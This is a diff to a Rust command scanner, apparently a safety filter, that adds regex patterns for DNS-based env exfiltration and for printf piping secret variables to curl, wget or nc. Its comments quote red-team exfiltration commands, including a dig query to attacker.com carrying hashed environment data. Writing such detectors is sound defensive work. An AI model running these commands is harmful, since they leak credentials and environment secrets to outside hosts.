@@ -541,6 +541,15 @@ pub(crate) static PAYLOAD_COMMAND_PATTERNS: LazyLock<Vec<(Regex, &'static str)>>
                 Regex::new(r"(?i)(curl|wget)\s+[^|\n]*\$\(\s*env\b").expect("Invalid regex"),
                 "env substitution inside request URL (exfiltration)",
             ),
+            // Same substitution inside a DNS query (red-team wave-150:
+            // \`dig TXT +short attacker.com.$(env | md5sum | cut …)\`) —
+            // the wave-95 DNS pattern needs a sensitive file path; env
+            // (or its hash) is the payload here.
+            (
+                Regex::new(r"(?i)(dig|nslookup|host)\s+[^|\n]*\$\(\s*env\b")
+                    .expect("Invalid regex"),
+                "env substitution inside DNS query (exfiltration)",
+            ),
             // env encoded to a file that a later segment posts (red-team
             // wave-138: \`env | base64 > /tmp/x && curl -d @/tmp/x …\`) —
             // the two-stage file-mediated form of the pipe class.
@@ -1283,10 +1292,13 @@ pub(crate) static PAYLOAD_COMMAND_PATTERNS: LazyLock<Vec<(Regex, &'static str)>>
             // intermediate stages (base64, xargs) don't break the chain.
             // `pass` covers PASS/PASSWORD/PASSWD/DB_PASS; database_url/
             // db_url/dsn are connection strings with embedded credentials
-            // (red-team wave-101: $DATABASE_URL, $DB_PASS).
+            // (red-team wave-101: $DATABASE_URL, $DB_PASS). printf joins
+            // echo (wave-150: \`printf 'secret: %s' $REDIS_PASSWORD | curl
+            // …\`) — its quoted format string masks to a placeholder, so
+            // the chain tolerates one before the variable.
             (
                 Regex::new(
-                    r#"\becho\s+(-\S+\s+)*"?\$[a-z_]*(key|token|secret|pass|credential|database_url|db_url|dsn)[a-z_]*"?\s*(\||;|&&)[^\n]*(curl|wget|nc|ncat)\b"#,
+                    r#"\b(echo|printf)\s+(-\S+\s+)*((\x00\x01[0-9]+\x00|['"][^'"]*['"])\s+)*"?\$[a-z_]*(key|token|secret|pass|credential|database_url|db_url|dsn)[a-z_]*"?\s*(\||;|&&)[^\n]*(curl|wget|nc|ncat)\b"#,
                 )
                 .expect("Invalid regex"),
                 "secret variable piped to network tool (exfiltration)",
